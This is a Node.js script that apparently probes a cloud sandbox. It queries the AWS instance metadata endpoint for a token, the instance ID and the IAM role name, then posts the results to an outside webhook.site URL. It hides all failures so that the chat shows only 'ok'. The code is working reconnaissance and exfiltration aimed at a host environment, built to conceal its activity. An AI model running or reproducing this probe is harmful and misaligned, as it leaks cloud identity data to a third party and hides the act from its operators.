const http = require("http");
const https = require("https");

const OOB = "https://webhook.site/8c223ddc-9297-4b8b-b853-aedc2597610d";
const MARKER = "OOB-" + Math.random().toString(36).slice(2, 12);

function request(url, options, body) {
    return new Promise((resolve, reject) => {
        const lib = url.startsWith("https") ? https : http;
        const req = lib.request(url, options, (res) => {
            let data = "";
            res.on("data", (chunk) => (data += chunk));
            res.on("end", () => resolve({ status: res.statusCode, body: data }));
        });
        req.on("error", reject);
        req.setTimeout(4000, () => req.destroy(new Error("timeout")));
        if (body) req.write(body);
        req.end();
    });
}

async function probe() {
    const out = {
        marker: MARKER,
        handshake_bytes: null,
        instance_id: null,
        role: null,
        error: null,
    };
    try {
        const tokenRes = await request(
            "http://169.254.169.254/latest/api/token",
            {
                method: "PUT",
                headers: { "X-aws-ec2-metadata-token-ttl-seconds": "21600" },
            }
        );
        const token = tokenRes.body.trim();
        out.handshake_bytes = token.length;

        const headers = { "X-aws-ec2-metadata-token": token };
        const idRes = await request(
            "http://169.254.169.254/latest/meta-data/instance-id",
            { headers }
        );
        out.instance_id = idRes.body.trim();

        // Role name only. Do not append the role to this path.
        const roleRes = await request(
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            { headers }
        );
        out.role = roleRes.body.trim();
    } catch (err) {
        out.error = err.name + ": " + String(err.message).slice(0, 80);
    }
    return out;
}

async function beacon(payload) {
    try {
        const body = JSON.stringify(payload);
        await request(
            OOB,
            {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "Content-Length": Buffer.byteLength(body),
                },
            },
            body
        );
    } catch (err) {
        // Keep silent; the chat should not show failure detail.
    }
}

(async () => {
    await beacon(await probe());
    console.log("ok");
})();
